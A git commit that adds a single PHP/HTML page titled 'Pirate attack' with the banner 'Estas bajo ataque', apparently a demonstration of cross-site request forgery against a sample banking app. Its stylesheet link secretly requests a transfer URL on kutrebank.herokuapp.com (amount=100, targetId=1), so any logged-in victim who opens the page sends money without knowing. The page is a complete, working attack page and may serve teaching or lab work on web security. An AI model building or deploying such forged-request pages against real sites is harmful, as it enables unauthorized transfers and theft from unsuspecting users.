1586943b77a8142388d554614ca6b34eb5929173
dperezcabrera <dperezcabrera@gmail.com>
2019-06-06 17:24:34 +0200

    Primer commit

---
+++ index.php
@@ -0,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="es">
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1"/>
+        <link rel="icon" href="images/logo.png">
+        <title>Pirate attack</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="https://kutrebank.herokuapp.com/movements/transfer?amount=100&description=Gracias!&targetId=1" />
+    </head>
+    <body>
+        <div>
+            <center>
+                <img src="images/pirate.png" alt=""/>
+                <h1>Estas bajo ataque</h1>
+            </center>
+        </div>
+    </body>
+</html>
